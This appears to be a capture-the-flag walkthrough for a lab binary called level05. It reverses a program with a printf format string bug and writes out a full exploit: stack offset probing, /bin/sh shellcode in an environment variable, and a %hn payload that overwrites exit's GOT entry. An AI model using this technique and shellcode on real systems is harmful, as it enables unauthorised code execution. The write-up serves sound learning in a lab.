# Walkthrough

## Reversing

```c
int main(void)
{
  char cVar1;
  uint uVar2;
  char *pcVar3;
  char useless;
  char buff [100];
  uint i;

  useless = '\0';
  fgets(buff,100,stdin);
  i = 0;
  do {
    uVar2 = 0xffffffff;
    pcVar3 = buff;
    do {
      if (uVar2 == 0) break;
      uVar2 = uVar2 - 1;
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + (uint)(byte)useless * -2 + 1;
    } while (cVar1 != '\0');
    if (~uVar2 - 1 <= i) {
      printf(buff); // FMT String Vuln
      exit(0);
    }
    if (('@' < buff[i]) && (buff[i] < '[')) {
      buff[i] = buff[i] ^ 32;
    }
    i = i + 1;
  } while( true );
}
```

This is another format string vulnerability, but with a little twist.

Before printing it's `XOR`ing every character with `32`, that basically just
converts uppercase letters into lowercase, so I'll make sure
not to write those characters in the format string.

The characters is `XOR`ing are all the uppercase letters:
```raw
65  A    66  B    67  C    68  D    69  E    70  F    71  G
72  H    73  I    74  J    75  K    76  L    77  M    78  N    79  O
80  P    81  Q    82  R    83  S    84  T    85  U    86  V    87  W
88  X    89  Y    90  Z
```

But, we aren't writing any of those right?

## Explotation

Things however are a little different from [rainfall `level05`](https://github.com/izenynn/rainfall/tree/main/level5),
this time we need to inject shellcode, which means, it will be on the stack,
which means the address will be hight, very hight.

But who cares? We could split the hight bytes and low bytes, using `%hn`, but
I don't mind waiting 30 minutes. But the evaluator might mind, so let's do this
in the right way... Zzz...

First, locate where our input starts in the `printf` stack:
```bash
$ ./level05
AAAA.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
aaaa.00000064.f7fcfac0.f7ec3af9.ffffd6bf.ffffd6be.00000000.ffffffff.ffffd744.f7fdb000.61616161.3830252e
```

In the `10`th item of the stack, let's check it with:
```bash
$ ./level05
AAAA.%10$08x
aaaa.61616161
```

Yep, that's it, cool.

Let's take the address of `exit` from the `.got.plt` section:
```raw
                     PTR_exit_080497e0                               XREF[1]:     exit:08048370  
080497e0 0c a0 04 08     addr       <EXTERNAL>::exit                                 = ??
```

The `exit` address is `080497e0`.

And the address of our shellcode:
```bash
export SC=$(python -c "print '\x90'*100+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
gcc getenv.c -m32 -o getenv
./getenv SC
# SC address: 0xffffde8b
```

So our shellcode address `0xffffde8b`.

Now, to forge the payload it will be a bit tricky, we need to write the
address 2 bytes at a time, using `%hn`. The only difference between the format
specifier `%hn` and `%n` is that `%hn` expects an unsigned short (2 bytes)
instead of an unsigned integer (4 bytes).

One important aspect is that we need to write the lower of both value first,
because we can easily print more characters after the first value but not less.

If we split in two the `SC` address it would be:
- `0xffff`.
- `0xde8b`.

We need to write first the low value, because of what I said earlier, but
remember the machine is little-endian, so the address we need to write is:
`8bdeffff`.

Knowing that, the payload will be like:
- Address of `exit` for the lower bytes of `SC`: `080497e0` (we will write `8bde`).
- Address of `exit` for the high bytes of `SC`: `080497e2` (`2` bytes more) (we will write `ffff`).
- Format string: `%Nu%10$hn` + `%Nu%11$hn`.

But how many bytes we should pad our `%hn`, so it writes the address of
our shellcode? let's see:
```bash
$ printf "%d\n" 0xffff
65535
$ printf "%d\n" 0xde8b
56971
```

Okey, substract the `8` bytes of the `exit` addresses, and substract the already
printed bytes from the second `%hn`:
```bash
bc

56971 - 8
56963

65535 - 56963
8572
```

So, our payload will be, in a python one-liner:
```bash
cat <(python -c "print '\x08\x04\x97\xe0'[::-1] + '\x08\x04\x97\xe2'[::-1] + '%56963u%10$hn' + '%8572u%11$hn'") - | ./level05
```

And that's all, another flag. This is getting harder! :D
